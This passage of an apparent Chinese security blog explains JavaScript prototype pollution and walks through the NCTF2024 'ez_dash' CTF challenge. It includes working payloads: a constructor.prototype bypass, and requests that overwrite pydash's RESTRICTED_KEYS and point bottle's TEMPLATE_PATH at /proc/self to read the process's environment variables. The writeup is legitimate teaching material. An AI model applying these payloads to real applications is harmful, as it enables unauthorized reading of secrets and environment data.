class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h4><p><a target="_blank" rel="noopener" href="https://zixyd.github.io/2024/01/31/原型链污染/">js原型污染 · zIxyd’s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/275619.html">JavaScript原型链污染原理及相关CVE漏洞剖析 - FreeBuf网络安全行业门户</a></p>
<p>JavaScript 中的每个对象都链接到某种类型的另一个对象，称为原型。JavaScript 使用原型继承模型，这与许多其他语言使用的基于类的模型有很大不同。默认情况下，JavaScript 会自动将新对象分配给其内置原型之一。例如，字符串会自动分配内置的<code>String.prototype</code>. 您可以在下面看到这些全局原型的更多示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myObject = &#123;&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(myObject);    <span class="comment">// Object.prototype</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myString = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(myString);    <span class="comment">// String.prototype</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myArray = [];</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(myArray);	    <span class="comment">// Array.prototype</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myNumber = <span class="number">1</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(myNumber);    <span class="comment">// Number.prototype</span></span><br></pre></td></tr></table></figure>
<p>对象会自动继承其指定原型的所有属性，除非它们已经拥有具有相同键的自己的属性。这使得开发人员能够创建可以重用现有对象的属性和方法的新对象</p>
<p>内置原型提供了用于处理基本数据类型的有用属性和方法。例如，<code>String.prototype</code>对象有一个<code>toLowerCase()</code>方法。因此，所有字符串都会自动有一个现成的方法将它们转换为小写。这使得开发人员不必手动将此行为添加到他们创建的每个新字符串中</p>
<p><strong>对象继承是如何工作的？</strong></p>
<p>每当您引用对象的属性时，JavaScript 引擎都会首先尝试直接在对象本身上访问该属性。如果对象没有匹配的属性，JavaScript 引擎会在对象的原型上查找它</p>
<p><img src="/img/lazy.gif" data-original="w14.png" alt=""></p>
<p>由于实际上 JavaScript 中的所有内容都是底层的对象，因此这条链最终会回到顶层<code>Object.prototype</code>，其原型很简单<code>null</code></p>
<h5 id="利用-proto-访问"><a href="#利用-proto-访问" class="headerlink" title="利用__proto__访问"></a>利用<code>__proto__</code>访问</h5><p>你可以这样访问：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username.<span class="property">__proto__</span></span><br><span class="line">username[<span class="string">&#x27;__proto__&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>甚至可以链接引用以<code>__proto__</code>沿着原型链向上工作：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username.<span class="property">__proto__</span>                        <span class="comment">// String.prototype</span></span><br><span class="line">username.<span class="property">__proto__</span>.<span class="property">__proto__</span>              <span class="comment">// Object.prototype</span></span><br><span class="line">username.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>    <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>E.g</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Teacher</span>(<span class="params">name,age,gender,subject</span>)&#123;</span><br><span class="line">	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,name);</span><br><span class="line">	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,age);</span><br><span class="line">	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,gender);</span><br><span class="line">	<span class="variable language_">this</span>.<span class="property">subject</span>=subject;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Teacher</span>.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Teacher</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure>
<p>这里的Person就是外部定义的一个类</p>
<p>创建一个构造函数<code>Teacher</code>，其中调用<code>Person.call</code>运行<code>Person</code>构造函数对<code>Teacher</code>中的<code>this.name</code>赋值，<code>new Person()</code> 会创建一个新的对象，并且这个对象的内部原型是 <code>Person.prototype</code>。将这个新对象赋值给 <code>Teacher.prototype</code> 后，<code>Teacher</code> 构造函数的原型对象就拥有了 <code>Person</code> 的原型属性和方法：</p>
<p><img src="/img/lazy.gif" data-original="w15.png" alt=""></p>
<h5 id="原型链污染-1"><a href="#原型链污染-1" class="headerlink" title="原型链污染"></a>原型链污染</h5><p>当JavaScript函数递归地将包含用户可控属性的对象合并到现有对象时，通常会出现原型污染漏洞。这可以允许攻击者注入带有类似<code>__proto__</code>的键的属性，以及任意嵌套的属性</p>
<p>由于<code>__proto__</code>在JavaScript上下文中的特殊含义，合并操作可能会将嵌套属性分配给对象的原型，而不是目标对象本身。因此，攻击者可以用包含恶意值的属性污染原型，这些属性随后可能被应用程序以危险的方式使用</p>
<p><code>__proto__</code> 是 JavaScript 中一个对象属性，用于访问该对象的原型对象</p>
<p><code>__proto__</code> 可以用于手动改变对象的原型，例如，当你想让一个已有的对象继承另一个对象的属性和方法时，可以使用它来改变原型</p>
<p><strong>1. <code>prototype</code> 属性</strong></p>
<ul>
<li><strong>定义</strong>：每个函数都有一个 <code>prototype</code> 属性，它是一个对象。当你通过构造函数创建一个新对象时，这个新对象会继承构造函数的 <code>prototype</code> 对象</li>
<li><strong>用途</strong>：<ul>
<li>用于定义构造函数的原型对象，该原型对象包含所有实例共享的属性和方法</li>
<li>实现继承：通过将一个构造函数的 <code>prototype</code> 设置为另一个构造函数的实例，可以实现继承</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="comment">// 实例属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 在构造函数的 prototype 上定义共享方法</span></span><br><span class="line">  <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, my name is <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> and I am <span class="subst">$&#123;<span class="variable language_">this</span>.age&#125;</span> years old.`</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 创建实例</span></span><br><span class="line">  <span class="keyword">const</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>);</span><br><span class="line">  <span class="keyword">const</span> person2 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Bob&quot;</span>, <span class="number">30</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 调用共享方法</span></span><br><span class="line">  person1.<span class="title function_">sayHello</span>(); <span class="comment">// 输出: Hello, my name is Alice and I am 25 years old.</span></span><br><span class="line">  person2.<span class="title function_">sayHello</span>(); <span class="comment">// 输出: Hello, my name is Bob and I am 30 years old.</span></span><br></pre></td></tr></table></figure>
<p><strong>2. <code>__proto__</code> 属性</strong></p>
<ul>
<li><strong>定义</strong>：每个对象都有一个 <code>__proto__</code> 属性，它指向创建该对象的构造函数的 <code>prototype</code> 对象。<code>__proto__</code> 是对象的内部原型引用</li>
<li><strong>用途</strong>：<ul>
<li>用于访问对象的原型对象</li>
<li>在原型链查找中，JavaScript 引擎会通过 <code>__proto__</code> 属性向上查找属性和方法</li>
</ul>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">__proto__</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="Json输入造成污染"><a href="#Json输入造成污染" class="headerlink" title="Json输入造成污染"></a>Json输入造成污染</h5><p>用户可控的对象通常是使用该<code>JSON.parse()</code>方法从 JSON 字符串派生的。有趣的是，<code>JSON.parse()</code>还将 JSON 对象中的任何键视为任意字符串，包括<code>__proto__</code>. 这为原型污染提供了另一个潜在载体。</p>
<p>假设攻击者通过网络消息注入以下恶意 JSON：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;evilProperty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;payload&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>如果通过该方法将其转换为 JavaScript 对象<code>JSON.parse()</code>，则生成的对象实际上将具有一个带有 key 的属性<code>__proto__</code>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> objectLiteral = &#123;<span class="attr">__proto__</span>: &#123;<span class="attr">evilProperty</span>: <span class="string">&#x27;payload&#x27;</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">const</span> objectFromJson = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;evilProperty&quot;: &quot;payload&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(objectLiteral.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>));     <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(objectFromJson.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>));    <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p> <code>hasOwnProperty</code>函数是JavaScript中的一个内置函数，用于检查对象自身是否包含指定的属性（即不包括从原型链继承的属性）</p>
<h5 id="绕过过滤了-proto-的污染"><a href="#绕过过滤了-proto-的污染" class="headerlink" title="绕过过滤了__proto__的污染"></a>绕过过滤了<code>__proto__</code>的污染</h5><p>假如一开始payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;__proto__&quot;:&#123;</span><br><span class="line">    &quot;json spaces&quot;:10</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有反应</p>
<p>可以用<code>constructor.prototype === __proto__</code>绕过</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;json spaces&quot;</span><span class="punctuation">:</span><span class="number">10</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h5 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h5><p>其实Javascript也不是所有都要用到<code>__proto__</code>的，这点在下面的例题中有所体现</p>
<h3 id="例题-5"><a href="#例题-5" class="headerlink" title="例题"></a>例题</h3><h4 id="NCTF2024-ez-dash"><a href="#NCTF2024-ez-dash" class="headerlink" title="NCTF2024 ez_dash"></a>NCTF2024 ez_dash</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;render&quot;</span></span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>) </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    blacklist=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先看到这个set，来看看是如何工作的</p>
<p><img src="/img/lazy.gif" data-original="w16.png" alt=""></p>
<p>可以发现set按顺序赋值，然后你传入一个对象、属性名、值就可以更改掉其属性的值</p>
<p><img src="/img/lazy.gif" data-original="w17.png" alt=""></p>
<p>E.g</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">miHoYo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;Honkai&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.game = <span class="string">&quot;3rd&quot;</span></span><br><span class="line"></span><br><span class="line">m = miHoYo()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;before changing : <span class="subst">&#123;m.game&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pydash.set_(m,<span class="string">&quot;game&quot;</span>,<span class="string">&quot;StarRailway&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;after changing : <span class="subst">&#123;m.game&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>可以看到结果：</p>
<p><img src="/img/lazy.gif" data-original="w18.png" alt=""></p>
<p>源码前面给了hint，所以下一步我们应该污染参数而读取environ</p>
<p>而源码中没有什么可以读取environ的途径，然后看到下面的<code>bottle.template(path)</code>返回了一个值，跟进看看</p>
<p><img src="/img/lazy.gif" data-original="w19.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookup = kwargs.pop(<span class="string">&#x27;template_lookup&#x27;</span>, TEMPLATE_PATH)</span><br></pre></td></tr></table></figure>
<p>lookup的搜索路径是<code>TEMPLATE_PATH</code>这个对象，然后看看<code>TEMPLATE_PATH</code></p>
<p><img src="/img/lazy.gif" data-original="w20.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TEMPLATE_PATH = [<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;./views/&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>默认的<code>TEMPLATE_PATH</code>是<code>[&#39;./&#39;, &#39;./views/&#39;]</code></p>
<p>其实到这里不继续深入的话就已经猜到可能是更改<code>TEMPLATE_PATH</code>默认的这个路径，让lookup去查找然后再由bottle.template渲染即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../proc/self/</span><br></pre></td></tr></table></figure>
<p>返回源码看<code>set_value()</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>payload应该是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setval.__globals__.bottle.TEMPLATE_PATH=[&#x27;../../../../proc/self/&#x27;]</span><br></pre></td></tr></table></figure>
<p>但是pydash是不允许修改<code>globals</code>属性的，但是在helpers.py中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESTRICTED_KEYS = (<span class="string">&quot;__globals__&quot;</span>,<span class="string">&quot;__builtins__&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>所以我们先污染这个值之后再污染path即可</p>
<p>payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setValue?name=pydash</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;[]&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">setValue?name=setval</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;../../../../proc/self/&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
